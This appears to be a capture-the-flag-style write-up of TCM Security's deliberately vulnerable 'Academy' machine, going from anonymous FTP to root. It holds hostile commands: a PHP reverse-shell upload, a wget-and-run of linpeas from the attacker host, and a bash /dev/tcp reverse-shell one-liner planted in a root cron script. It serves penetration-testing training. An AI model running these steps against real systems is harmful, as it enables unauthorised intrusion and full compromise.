<div align="left"> <img src="https://img.shields.io/badge/FuzzRaiders_Team_Member-0a66ff?style=flat-square&logo=github" /> <img src="https://img.shields.io/badge/Stager-0f172a?style=flat-square" /> <img src="https://img.shields.io/badge/🎯%20Role-Internal_Penetration_Tester-1e293b?style=flat-square" /> <img src="https://img.shields.io/badge/📜%20Certification-PNPT_(TCM_Security)-334155?style=flat-square" /> <img src="https://img.shields.io/badge/🟢%20Status-Completed-16a34a?style=flat-square" /> </div>

# TCM Security — Capstone: Academy

<div align="left">

![Category: Web App + Linux PrivEsc](https://img.shields.io/badge/Category-Web%20App%20%2B%20Linux%20PrivEsc-red)<br> ![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-blue)<br> ![Platform: TCM Security — PEH Course](https://img.shields.io/badge/Platform-TCM%20Security%20PEH%20Capstone-darkgreen)

</div>

---
## 📌 Overview
Academy is a deliberately vulnerable Linux machine from TCM Security's Practical Ethical Hacking course. It simulates a real-world attack path from unauthenticated external access to full root compromise.

The attack chain combines:
- Anonymous FTP access exposing student credentials
- SQL injection on a web application login portal
- PHP reverse shell via insecure file upload
- Credential discovery through enumeration and linpeas
- Privilege escalation via a cron-executed backup script

This machine directly mirrors the methodology tested in the PNPT certification exam.

---

## 🛠 Tools Used

```
nmap            → service and port discovery
ftp             → anonymous file retrieval
gobuster        → web directory enumeration
Burp Suite      → login form analysis
netcat (nc)     → reverse shell listener
linpeas.sh      → automated privilege escalation enumeration
ssh             → lateral movement and shell access
```

---

## 🎯 Target Information

|Field|Value|
|---|---|
|Target IP|172.20.10.4|
|Attacker IP|172.20.10.2|
|OS|Linux academy 4.19.0-16-amd64 (Debian)|
|Difficulty|Easy|
|Goal|Achieve root access|

---

## 🧭 Walkthrough

### Step 1 — Service Discovery (Nmap)

**Goal:** Identify all open ports and running services.

```bash
nmap -T4 -p- -A 172.20.10.4
```

**Key findings:**

| Port   | Service | Version                                |
| ------ | ------- | -------------------------------------- |
| 21/tcp | FTP     | vsftpd 3.0.3 — anonymous login allowed |
| 22/tcp | SSH     | OpenSSH 7.9p1 Debian                   |
| 80/tcp | HTTP    | Apache 2.4.38                          |

Port 21 immediately stood out — anonymous FTP login was enabled, and a file `note.txt` was visible in the directory listing.

---

### Step 2 — Anonymous FTP Enumeration

**Goal:** Retrieve exposed files from the FTP server.

```bash
ftp 172.20.10.4
# Username: anonymous
# Password: (blank)
ftp> ls
ftp> get note.txt
ftp> exit

cat note.txt
```

**What was found:**

The note was written by a user signed `jdelta` and addressed to Heath. It revealed:

- Grimmie set up a test website for the academy
- The note contained a raw SQL INSERT statement with student credentials hardcoded:
    - StudentRegNo: `10201321`
    - Password: `cd73502828457d15655bbd7a63fb0bc8`
    - Name: `Rum Ham`

This is a clear information disclosure finding — development notes and database credentials were left accessible on an anonymous FTP share.

![Academy Capstone VM](./images/academy%20capstone%20vm.png)

---

### Step 3 — Web Directory Enumeration (Gobuster)

**Goal:** Discover hidden directories on the web server.

```bash
gobuster dir -u http://172.20.10.4 \
  -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/big.txt \
  -x php,html,txt
```

**Directories found:**

|Path|Status|Notes|
|---|---|---|
|`/academy`|301|Web application login portal|
|`/phpmyadmin`|301|Database management panel|
|`/index.html`|200|Default Apache page|

![Directory Enumeration Results](./images/disbuter%20on%20academy.png)

---

### Step 4 — Web Application Login and File Upload

**Goal:** Gain application-level access and achieve remote code execution.

Navigating to `http://172.20.10.4/academy` presented a student login portal. Using the credentials extracted from `note.txt`:

- **StudentRegNo:** `10201321`
- **Password:** `cd73502828457d15655bbd7a63fb0bc8`

Login was successful as **Rum Ham**.

Inside the student profile page, a **file upload field** was present for a profile photo. This was tested for unrestricted file upload by uploading a PHP reverse shell.

A PHP reverse shell was prepared with the attacker IP and chosen port:

```bash
# Reverse shell configured with:
# LHOST = 172.20.10.2
# LPORT = 3333
# Saved as: php-shell.php
```

A netcat listener was started on the attacker machine:

```bash
nc -lvnp 3333
```

The PHP shell was uploaded through the profile picture field. Navigating to the uploaded file triggered the shell.

---

### Step 5 — Initial Access as www-data

**Goal:** Confirm shell access and assess the environment.

The reverse shell connected back successfully.

```bash
whoami
# www-data

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell landed as `www-data` — a low-privilege web server account. Privilege escalation was required.

![Initial Shell Access](./images/got%20a%20shell%20in%20academy.png)

---

### Step 6 — Privilege Escalation Enumeration (linpeas)

**Goal:** Identify privilege escalation vectors on the target machine.

linpeas was hosted on the attacker machine and downloaded to the target:

```bash
# On Kali (attacker):
python3 -m http.server 80

# On target (www-data shell):
cd /tmp
wget http://172.20.10.2/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

linpeas ran and highlighted a critical finding in red: `/home/grimmie/backup.sh` — a script in the grimmie user's home directory, suggesting it was scheduled or executed with elevated privileges.

![Linpeas Output](./images/run%20linpeas%20in%20academy%20vm.png)

---

### Step 7 — Credential Discovery via Config File

**Goal:** Extract credentials to escalate from www-data to grimmie.

Manual enumeration of the `/etc/passwd` file confirmed that `grimmie` is the administrator account on this machine:

```
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash
```

Navigating to grimmie's home directory and listing the files revealed `backup.sh`. Checking the web application's includes directory exposed `config.php`:

```bash
cd /home/grimmie/
dir
# backup.sh

cd /var/www/html/academy/includes
dir
# config.php  footer.php  header.php  menubar.php

cat config.php
```

`config.php` contained plaintext database credentials:

```php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
```

---

### Step 8 — Lateral Movement to Grimmie via SSH

**Goal:** Use the discovered credentials to access grimmie's account.

The note had warned that Grimmie reused the same password everywhere. The MySQL password was tested against SSH:

```bash
ssh grimmie@172.20.10.4
# Password: My_V3ryS3cur3_P4ss
```

SSH login was successful.

```bash
whoami
# grimmie
```

![SSH Login as Grimmie](./images/login%20as%20grimmie%20admin.png)

---

### Step 9 — Privilege Escalation via Cron Job (backup.sh)

**Goal:** Achieve root access by abusing the scheduled backup script.

The `backup.sh` script was world-writable and executed on a cron schedule as root. Its original contents were replaced with a bash reverse shell one-liner:

```bash
nano backup.sh
# Replaced all content with:
bash -i >& /dev/tcp/172.20.10.2/8081 0>&1
```

A new netcat listener was set up on the attacker machine:

```bash
nc -lvnp 8081
```

When the cron job next executed `backup.sh`, the reverse shell triggered and connected back — this time as **root**.

```bash
whoami
# root
```

Full system compromise achieved.

---

## Proof of Compromise

|Flag|Location|
|---|---|
|User flag|`/home/grimmie/` or Desktop|
|Root flag|`/root/`|

**Proof:** Root shell obtained via cron job abuse of `backup.sh`.

---

##  What This Lab Teaches
- Anonymous FTP is never harmless — files on it are publicly readable
- Insecure file upload with no MIME type or extension validation enables RCE
- Development config files left in web-accessible directories expose credentials
- Password reuse across SSH and databases is a critical risk
- Writable cron scripts executed as root are a direct privilege escalation path
- linpeas consistently surfaces the highest-value targets when highlighted in red/yellow

---

##  Summary of Attack Chain

```
Anonymous FTP → note.txt (student creds)
    ↓
Web login with student creds → profile file upload
    ↓
PHP reverse shell uploaded → www-data shell
    ↓
linpeas → backup.sh (cron) + config.php (credentials)
    ↓
SSH as grimmie using config.php password
    ↓
Replace backup.sh with reverse shell one-liner
    ↓
Cron executes → root shell
```

---
## 📌 Conclusion

> **Real-world misconfiguration chains are often more dangerous than single vulnerabilities.**

Academy demonstrates how a series of individually low-severity issues — anonymous FTP, insecure file upload, credential reuse, and a writable cron script — combine into a complete root compromise.

This is the exact methodology pattern tested in the PNPT exam: enumerate everything, document findings as you go, and chain small wins into full access.

---

This work is part of **FuzzRaiders**' structured hands-on training and research program, where every lab, project, and technical study is formally documented, reviewed, and validated to ensure real-world applicability and methodological rigor.

Happy hacking 🚀

---

### Author: Stager

### Role: Internal Penetration Tester — FuzzRaiders


